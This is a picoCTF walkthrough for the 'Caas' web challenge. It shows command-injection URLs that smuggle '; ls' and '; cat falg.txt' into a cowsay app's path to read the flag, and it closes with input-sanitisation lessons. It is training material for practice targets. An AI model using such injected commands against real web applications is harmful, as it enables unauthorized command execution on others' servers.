# PicoCTF Lab Walkthrough – Caas

## 📌 Challenge Info

* **Category**: Web Exploitation
* **Difficulty**: Easy

---

## 📝 Challenge Description

Exploit command injection in a cowsay application to retrieve the flag.

---

## 🔍 Initial Recon

* **Files provided**: None
* **Services/Ports**: Web app running cowsay
* **Hints given**: Command injection suspected

---

## 🛠️ Tools & Commands Used

| Tool / Command             | Purpose                        |
| -------------------------- | ------------------------------ |
| Browser / URL manipulation | Test command injection         |
| `ls`                       | List files on server           |
| `cat`                      | Read contents of the flag file |

---

## 🧠 Step-by-Step Solution

1. **Command Injection Testing**

   * Sent:

   ```
   https://caas.mars.picoctf.net/cowsay/hello;%20ls
   ```

   * Revealed the file: `falg.txt`

2. **Flag Retrieval**

   * Sent:

   ```
   https://caas.mars.picoctf.net/cowsay/hello;%20cat%20falg.txt
   ```

   * Successfully retrieved the flag.

---

## 🧾 Flag

picoCTF{\[flag]}

---

## 📚 Learning Outcomes

* Applications using system calls (like `exec`) are vulnerable to command injection if inputs aren’t sanitized.
* Even simple user input can be leveraged to execute arbitrary commands.
* Always validate and sanitize inputs when executing shell commands.

---
